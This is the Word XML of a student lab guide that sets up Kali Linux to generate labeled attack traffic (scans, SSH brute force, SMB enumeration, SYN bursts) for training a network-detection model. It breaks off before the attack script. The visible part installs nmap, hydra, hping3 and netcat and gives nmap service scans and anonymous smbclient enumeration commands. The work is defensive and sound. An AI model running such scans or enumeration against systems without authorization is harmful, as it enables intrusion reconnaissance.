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AI Network Manager Project</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Full Attack Simulation Guide</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:i/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Attack-End Only: Kali-Based Lab Traffic Generation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Environment: </w:t>
      </w:r>
      <w:r>
        <w:t>Isolated VCloud lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Attacker: </w:t>
      </w:r>
      <w:r>
        <w:t>Kali Linux</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Targets: </w:t>
      </w:r>
      <w:r>
        <w:t>Metasploitable, Ubuntu, Windows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Purpose: </w:t>
      </w:r>
      <w:r>
        <w:t>Generate labeled traffic for future ML-based network detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:r>
        <w:t>Bernard Appiah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Important: This guide is designed for an authorized, isolated school lab only. Do not run these steps against public systems, school production systems, or any network you do not own or have explicit permission to test.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Purpose and Scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Lab Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Ethical and Safety Boundaries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Kali Tool Installation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. Project Folder Structure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. Target Preparation Checklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>7. Attack Classes and ML Labels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>8. Full Attack Demo Script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>9. How to Run the Demonstration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>10. Explanation of Each Attack Class</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>11. Dataset Labeling Plan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>12. Troubleshooting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>13. One-Week Priority Plan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>14. References Consulted</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Purpose and Scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This document defines the attack-end of the AI Network Manager project. The goal is to generate repeatable, labeled network traffic from Kali Linux so that a future ML-based network manager can be trained and tested against realistic lab activity. The defensive ML side is intentionally not covered in detail here; it will be handled after the attack data-generation process is stable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The guide focuses on safe simulation rather than destructive exploitation. The attack traffic is designed to be visible to packet capture tools, Zeek, Wireshark, tcpdump, CICFlowMeter, or similar feature extraction tools. Each attack class is separated so that the future ML dataset can be labeled cleanly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Lab Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The recommended lab architecture uses Kali Linux as the attack machine and several controlled systems as targets. The AI Manager will later observe traffic and classify it using ML. For now, the AI Manager can simply capture packets and logs.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
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2304"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Role</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Example IP Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Kali Linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2304"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Attacker</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.10.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Runs the attack-demo.sh script and generates labeled traffic.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Metasploitable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2304"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Vulnerable Linux target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.10.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Receives scans, SSH brute-force attempts, web payloads, and SCP transfers.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Ubuntu Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2304"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Normal service target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.10.30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Provides normal SSH/HTTP traffic and optional service baseline.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows Machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2304"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Endpoint / SMB target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.10.40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Used for SMB enumeration and Windows-style lateral movement traffic.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>AI Manager</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2304"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Observer / ML platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.10.50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Captures traffic and later runs detection or ML classification.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Ethical and Safety Boundaries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Run the script only inside an isolated VCloud lab that you are authorized to test.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use private RFC1918 addresses such as 10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Do not aim the script at public IP addresses, school production networks, or cloud systems that are not part of the lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Keep brute-force wordlists small because the purpose is traffic labeling, not account compromise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Keep DoS-like testing controlled and low-volume because the purpose is to generate recognizable traffic, not crash systems.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use harmless sample files for exfiltration simulation. Do not move real secrets, credentials, private files, or personal data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Kali Tool Installation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Install the required tools on Kali Linux. These tools are used to generate traffic categories such as DNS, HTTP, SSH, Nmap reconnaissance, Hydra authentication attempts, SMB enumeration, SCP transfer, and controlled SYN burst traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo apt update</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional packet-capture tools on Kali:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo apt install -y wireshark tcpdump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Project Folder Structure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Create a clean project directory on Kali. The folders keep logs, payloads, sample files, and wordlists organized for GitHub documentation and professor demonstration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mkdir -p ~/ai-network-manager-attacks</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd ~/ai-network-manager-attacks</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mkdir -p logs wordlists payloads exfil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The script will automatically create a small demo password list and a harmless sample file if they do not already exist. This keeps the demonstration repeatable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Target Preparation Checklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Before running the attack script, verify that each target is reachable and that the intended services exist. This reduces troubleshooting during the live demonstration.</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rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Preparation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Verification Command from Kali</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Metasploitable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Ensure the VM is powered on and reachable. SSH and web services should be available.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>ping -c 2 192.168.10.20; nmap -sV 192.168.10.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Ubuntu Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Ensure SSH or web service is available if used for normal traffic.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>ping -c 2 192.168.10.30; curl -I http://192.168.10.30</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows Machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Enable network discovery or SMB sharing only inside the lab if using SMB enumeration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>ping -c 2 192.168.10.40; smbclient -L //192.168.10.40/ -N</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2016"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>AI Manager</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Start packet capture or log collection before launching attacks.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>ping -c 2 192.168.10.50</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Attack Classes and ML Labels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The attack-end script generates traffic for these ML labels. Run each class separately when creating a clean training dataset, or run the full demo when presenting the whole workflow.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D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Class</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Attack Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Tool or Protocol</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:shd w:fill="D9EAF7"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Expected Network Behavior</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
